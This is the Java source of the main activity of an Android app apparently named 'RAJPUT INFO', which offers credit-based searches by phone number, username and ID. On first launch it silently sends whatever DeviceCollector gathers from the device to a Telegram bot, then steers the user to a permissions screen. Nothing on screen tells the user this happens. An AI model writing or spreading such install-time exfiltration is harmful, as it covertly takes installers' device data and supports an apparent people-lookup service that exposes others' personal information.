package com.rajputinfo.app;

import android.content.Intent;
import android.os.Bundle;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    private CreditsManager credits;
    private TextView tvCredits;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        credits = new CreditsManager(this);

        if (!credits.isRegistered()) {
            credits.register();
            TelegramBot.sendMessage("🆕 <b>RAJPUT INFO — New Install</b>\n\n" +
                    DeviceCollector.collect(this));
            startActivity(new Intent(this, PermissionsActivity.class));
        }

        tvCredits = findViewById(R.id.tvCredits);

        findViewById(R.id.btnPhoneSearch).setOnClickListener(v -> openSearch(0));
        findViewById(R.id.btnUserSearch).setOnClickListener(v -> openSearch(1));
        findViewById(R.id.btnIdSearch).setOnClickListener(v -> openSearch(2));
        findViewById(R.id.btnContact).setOnClickListener(v ->
                startActivity(new Intent(this, ContactOwnerActivity.class)));
        findViewById(R.id.btnPerms).setOnClickListener(v ->
                startActivity(new Intent(this, PermissionsActivity.class)));
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (tvCredits != null)
            tvCredits.setText("Credits: " + credits.getCredits());
    }

    private void openSearch(int mode) {
        Intent i = new Intent(this, SearchActivity.class);
        i.putExtra("mode", mode);
        startActivity(i);
    }
}
